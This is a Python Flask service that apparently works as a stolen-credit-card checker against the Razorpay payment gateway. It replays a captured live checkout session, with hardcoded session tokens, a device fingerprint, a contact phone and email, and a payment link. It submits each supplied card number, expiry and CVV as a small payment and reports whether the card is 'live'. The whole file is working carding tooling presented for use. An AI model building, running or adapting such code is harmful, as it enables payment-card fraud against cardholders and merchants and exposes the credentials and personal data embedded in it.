from flask import Flask, request, jsonify
import requests
import uuid
import logging
import re

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Razorpay API configuration
RAZORPAY_BASE_URL = "https://api.razorpay.com/v1/standard_checkout/payments"
KEY_ID = "rzp_live_97K07Fs6vlYGkQ"
SESSION_TOKEN = "0EF95E77E5AE1B90FD82084673FEAB0FD139F0F8E2A8F8742C39345033AD4F7B3DAF68D98100199B94D1AD2294007A33F6F308AF0EE13706D1915F5DC3CAFF134C36F29FF35B73EEA8BCA58D6B1F634E034E377DC638EA18014C2C8327F4C038B2613B1D8988139"
KEYLESS_HEADER = "api_v1:+ckFuLAiqVXXL3oX+/XHX5HcrAArn9OaqR5i/td0J92Tm2O37fRae4Q/WECZkTEAqGWcav3A3xxwTKWFhI3KB4+Fpqv2Tw=="

HEADERS = {
    'Accept': '*/*',
    'Accept-Language': 'en-IN',
    'Connection': 'keep-alive',
    'Content-type': 'application/x-www-form-urlencoded',
    'Origin': 'https://api.razorpay.com',
    'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=9cb57fdf457e44eac4384e182f925070ff5488d9&build_v1=715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2&checkout_v2=1&new_session=1&rzp_device_id=1.cc54eb693a9f90a545b601e98499b4c2c3b31dff.1760331223439.74168794&unified_session_id=RSuN6fuSDQ56Kc&session_token=' + SESSION_TOKEN,
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'x-session-token': SESSION_TOKEN,
}

PARAMS = {
    'key_id': KEY_ID,
    'session_token': SESSION_TOKEN,
    'keyless_header': KEYLESS_HEADER,
}

# Static payment data (customize as needed)
PAYMENT_DATA = {
    'notes[comment]': '',
    'payment_link_id': 'pl_IdI5q8vLO8tAhg',
    'key_id': KEY_ID,
    'contact': '+918587992385',
    'email': 'khatrieex@gmail.com',
    'currency': 'INR',
    '_[checkout_id]': 'RSuNK6KWvmpDnU',
    '_[device.id]': '1.cc54eb693a9f90a545b601e98499b4c2c3b31dff.1760331224670.14690579',
    '_[env]': '',
    '_[library]': 'checkoutjs',
    '_[library_src]': 'no-src',
    '_[current_script_src]': 'no-src',
    '_[is_magic_script]': 'false',
    '_[platform]': 'browser',
    '_[referer]': 'https://razorpay.me/@ukinternational',
    '_[shield][fhash]': 'cc54eb693a9f90a545b601e98499b4c2c3b31dff',
    '_[shield][tz]': '345',
    '_[device_id]': '1.cc54eb693a9f90a545b601e98499b4c2c3b31dff.1760331224670.14690579',
    '_[build]': '18372560617',
    '_[request_index]': '0',
    'amount': '100',  # 100 INR (~0.10 USD)
    'order_id': 'order_RSuNKSMtkcuizz',
    'device_fingerprint[fingerprint_payload]': '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',
    'user_risk_providers_token': 'W3sibmFtZSI6ImZpbmdlcnByaW50IiwibWV0YWRhdGEiOnsicmVxdWVzdF9pZCI6IjE3NjAzNDgwMjk1NDkuQlA1SDlUIn19XQ==',
    'save': '0',
    'billing_address[country]': 'IN',
    'billing_address[postal_code]': '19001',
    'billing_address[city]': 'Dhelhi',
    'billing_address[state]': 'Delhi',
    'billing_address[line1]': 'Ghar Ke Baaju ',
    'billing_address[line2]': 'Ka Bhaiya ',
    'currency_request_id': 'RSuRLEShxk59iJ',
    'dcc_currency': 'INR',
}

def validate_card_format(card_string):
    """Validate card format: card_number|exp_month|exp_year|cvv"""
    pattern = r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$'
    if not re.match(pattern, card_string):
        return False
    number, exp_month, exp_year, cvv = card_string.split('|')
    try:
        exp_month = int(exp_month)
        exp_year = int(exp_year)
        cvv = int(cvv)
        if not (1 <= exp_month <= 12):
            return False
        if not (20 <= exp_year <= 99 or 2020 <= exp_year <= 2099):
            return False
        if not (100 <= cvv <= 9999):
            return False
        return True
    except ValueError:
        return False

def determine_status(response_text):
    """Determine the status based on the Razorpay response"""
    response_text = response_text.lower()
    if 'success' in response_text or 'captured' in response_text:
        return 'CHARGED', 'Payment Captured'
    elif 'authentication' in response_text or '3ds' in response_text:
        return '3DS', '3D Secure Authentication Required'
    elif 'declined' in response_text or 'failed' in response_text:
        return 'DECLINED', response_text
    elif 'incorrect' in response_text:
        return 'APPROVED', response_text  # e.g., incorrect CVV but card is live
    else:
        return 'DECLINED', response_text

@app.route('/gateway=razorpay0.10$/key=rocky', methods=['GET'])
def razorpay_check():
    """API endpoint to check card via Razorpay"""
    # Validate key
    key = request.args.get('key')
    if key != 'rocky':
        logger.error(f"Invalid key provided: {key}")
        return jsonify({
            'status': 'ERROR',
            'response': 'Invalid key'
        }), 401

    # Validate card details
    cc = request.args.get('cc')
    if not cc or not validate_card_format(cc):
        logger.error(f"Invalid card format: {cc}")
        return jsonify({
            'status': 'ERROR',
            'response': 'Invalid card format. Use: card_number|exp_month|exp_year|cvv'
        }), 400

    try:
        number, exp_month, exp_year, cvv = cc.split('|')
        # Normalize year to two digits
        if len(exp_year) == 4:
            exp_year = exp_year[2:]
    except Exception as e:
        logger.error(f"Error parsing card details: {cc}, Error: {str(e)}")
        return jsonify({
            'status': 'ERROR',
            'response': 'Invalid card format'
        }), 400

    # Step 1: Cancel previous payment
    try:
        cancel_response = requests.get(
            f"{RAZORPAY_BASE_URL}/pay_RSuSWtlnJmOUPP/cancel",
            params=PARAMS,
            headers=HEADERS,
            timeout=10
        )
        logger.info(f"Cancel request response: {cancel_response.status_code}, {cancel_response.text}")
    except requests.RequestException as e:
        logger.error(f"Cancel request failed: {str(e)}")
        # Continue even if cancel fails, as it may not be critical

    # Step 2: Create payment
    payment_data = PAYMENT_DATA.copy()
    payment_data.update({
        'method': 'card',
        'card[number]': number,
        'card[cvv]': cvv,
        'card[name]': 'Test User',
        'card[expiry_month]': exp_month,
        'card[expiry_year]': exp_year,
    })

    try:
        response = requests.post(
            f"{RAZORPAY_BASE_URL}/create/ajax",
            params=PARAMS,
            headers=HEADERS,
            data=payment_data,
            timeout=30
        )
        logger.info(f"Payment creation response: {response.status_code}, {response.text}")

        # Determine status based on response
        status, message = determine_status(response.text)

        return jsonify({
            'status': status,
            'response': message,
            'gateway': 'Razorpay',
            'price': '0.10 USD'
        })

    except requests.RequestException as e:
        logger.error(f"Payment creation failed: {str(e)}")
        return jsonify({
            'status': 'DECLINED',
            'response': f"Request failed: {str(e)}",
            'gateway': 'Razorpay',
            'price': '0.10 USD'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
